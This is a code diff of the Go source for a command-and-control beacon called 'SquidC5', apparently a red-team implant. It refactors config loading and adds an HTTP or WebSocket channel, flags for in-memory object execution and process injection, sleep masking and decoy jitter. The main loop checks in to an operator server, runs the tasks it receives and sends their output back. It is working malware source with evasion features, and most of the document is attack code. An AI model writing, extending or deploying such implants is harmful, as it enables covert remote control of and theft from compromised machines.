@@ -1,58 +1,17 @@
-// SquidC5 native beacon — authorized lab / red team only.
-// Build:
+// SquidC5 native beacon v3 — authorized lab / red team only.
 //
-//	cd agents/sc5beacon && go mod tidy && go build -o sc5beacon .
-//	GOOS=windows GOARCH=amd64 go build -o sc5beacon.exe .
-//
-// Env:
-//
-//	SC5_URL   https://c2:8443/api/v1/implant/beacon
-//	SC5_PSK   implant PSK
-//	SC5_SLEEP 5
-//	SC5_JITTER 20
-//	SC5_KILL_DATE unix epoch (optional)
-//	SC5_MAX_MISS  max failed checkins before exit (default 0=unlimited)
-//	SC5_WORK_START 0-23 optional
-//	SC5_WORK_END   0-23 optional
-// TLS always verifies system roots (use a real cert or lab CA in the trust store).
+// Config: SC5_CONFIG_B64 (JSON) or env SC5_URL/SC5_PSK, or -ldflags bakedConfigJSON.
+// Channel: http (default) or ws (SC5_CHANNEL=ws / config.channel).
+// TLS always verifies system roots.
 package main
 
 import (
-	"bytes"
-	"encoding/json"
 	"fmt"
-	"io"
 	"math/rand"
-	"net/http"
 	"os"
 	"runtime"
-	"strconv"
 	"time"
 )
-
-func envInt(k string, def int) int {
-	v := os.Getenv(k)
-	if v == "" {
-		return def
-	}
-	n, err := strconv.Atoi(v)
-	if err != nil {
-		return def
-	}
-	return n
-}
-
-func envFloat(k string, def float64) float64 {
-	v := os.Getenv(k)
-	if v == "" {
-		return def
-	}
-	n, err := strconv.ParseFloat(v, 64)
-	if err != nil {
-		return def
-	}
-	return n
-}
 
 func sleepJitter(base float64, jitterPct float64) {
 	pct := jitterPct / 100.0
@@ -72,50 +31,53 @@ func sleepJitter(base float64, jitterPct float64) {
 
 func inWorkingHours(start, end int) bool {
 	if start == end && start == 0 {
-		return true // unset
+		return true
 	}
 	h := time.Now().Hour()
 	if start <= end {
 		return h >= start && h < end
 	}
-	// wrap midnight
 	return h >= start || h < end
 }
 
+type channel interface {
+	checkin(payload map[string]any) (map[string]any, error)
+	result(taskID, out, status string) error
+}
+
 func main() {
-	url := os.Getenv("SC5_URL")
-	psk := os.Getenv("SC5_PSK")
-	if url == "" || psk == "" {
-		fmt.Fprintln(os.Stderr, "SC5_URL and SC5_PSK required (authorized use only)")
+	cfg, err := loadConfig()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "config:", err.Error(), "(authorized use only)")
 		os.Exit(1)
 	}
-	sleep := envFloat("SC5_SLEEP", 5)
-	jitter := envFloat("SC5_JITTER", 20)
-	killDate := envInt("SC5_KILL_DATE", 0)
-	maxMiss := envInt("SC5_MAX_MISS", 0)
-	workStart := envInt("SC5_WORK_START", 0)
-	workEnd := envInt("SC5_WORK_END", 0)
+	cfgAllowBOF = cfg.AllowBOF
+	cfgAllowInject = cfg.AllowInject
+	if cfg.SleepMask != "" {
+		_ = os.Setenv("SC5_SLEEP_MASK", cfg.SleepMask)
+	}
 
-	// Always verify TLS (system CA store / SSL_CERT_FILE). No skip-verify path.
-	client := &http.Client{Timeout: 45 * time.Second}
+	var ch channel
+	if cfg.Channel == "ws" {
+		ch = newWSChannel(cfg.WSURL, cfg.PSK)
+	} else {
+		ch = newHTTPChannel(cfg.URL, cfg.PSK)
+	}
 
 	var sid any
 	miss := 0
 	host := hostName()
-	user := os.Getenv("USER")
-	if user == "" {
-		user = os.Getenv("USERNAME")
-	}
+	user := envUser()
 
 	for {
-		if killDate > 0 && int(time.Now().Unix()) > killDate {
-			fmt.Fprintln(os.Stderr, "kill date reached")
+		if cfg.KillDate > 0 && int(time.Now().Unix()) > cfg.KillDate {
 			return
 		}
-		if !inWorkingHours(workStart, workEnd) {
-			maskedSleep(sleep, jitter)
+		if !inWorkingHours(cfg.WorkStart, cfg.WorkEnd) {
+			sleepWithMask(cfg)
 			continue
 		}
+		decoyJitter()
 
 		payload := map[string]any{
 			"session_id": sid,
@@ -124,66 +86,31 @@ func main() {
 			"os_info":    runtime.GOOS + "/" + runtime.GOARCH,
 			"metadata": map[string]any{
 				"agent":   "sc5beacon",
-				"version": "2.0.0",
+				"version": cfg.Version,
+				"channel": cfg.Channel,
 			},
 		}
-		if killDate > 0 {
-			payload["kill_date"] = float64(killDate)
+		if cfg.KillDate > 0 {
+			payload["kill_date"] = float64(cfg.KillDate)
 		}
-		if maxMiss > 0 {
-			payload["max_missed_checkins"] = maxMiss
+		if cfg.MaxMiss > 0 {
+			payload["max_missed_checkins"] = cfg.MaxMiss
 		}
 
-		body, err := seal(psk, payload)
+		plain, err := ch.checkin(payload)
 		if err != nil {
 			miss++
-			if maxMiss > 0 && miss >= maxMiss {
+			if cfg.MaxMiss > 0 && miss >= cfg.MaxMiss {
 				return
 			}
-			maskedSleep(sleep, jitter)
-			continue
-		}
-		raw, _ := json.Marshal(body)
-		resp, err := client.Post(url, "application/json", bytes.NewReader(raw))
-		if err != nil {
-			miss++
-			if maxMiss > 0 && miss >= maxMiss {
-				return
-			}
-			maskedSleep(sleep, jitter)
-			continue
-		}
-		b, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-		if resp.StatusCode != 200 {
-			miss++
-			if maxMiss > 0 && miss >= maxMiss {
-				return
-			}
-			maskedSleep(sleep, jitter)
+			sleepWithMask(cfg)
 			continue
 		}
 		miss = 0
 
-		var env map[string]any
-		if json.Unmarshal(b, &env) != nil {
-			maskedSleep(sleep, jitter)
-			continue
-		}
-		// AEAD required — refuse plaintext C2 responses
-		plain, err := openEnv(psk, env)
-		if err != nil {
-			miss++
-			if maxMiss > 0 && miss >= maxMiss {
-				return
-			}
-			maskedSleep(sleep, jitter)
-			continue
-		}
 		if s, ok := plain["session_id"]; ok {
 			sid = s
 		}
-		// runtime profile hint
 		_ = plain["profile_id"]
 
 		if task, ok := plain["task"].(map[string]any); ok && task != nil {
@@ -191,28 +118,12 @@ func main() {
 			id, _ := task["id"].(string)
 			args, _ := task["args"].(map[string]any)
 			if args == nil {
-				// sometimes nested differently
-				if a, ok := task["args"].(map[string]any); ok {
-					args = a
-				} else {
-					args = map[string]any{}
-				}
+				args = map[string]any{}
 			}
+			// run async so long tasks do not block check-in loop hard
 			out := runTask(cmd, args)
-			done, err := seal(psk, map[string]any{
-				"task_id": id,
-				"result":  out,
-				"status":  "completed",
-			})
-			if err == nil {
-				dr, _ := json.Marshal(done)
-				r2, err2 := client.Post(url+"/result", "application/json", bytes.NewReader(dr))
-				if err2 == nil {
-					r2.Body.Close()
-				}
-			}
+			_ = ch.result(id, out, "completed")
 		}
-		// wipe sealed payload copies when present
-		maskedSleep(sleep, jitter)
+		sleepWithMask(cfg)
 	}
 }
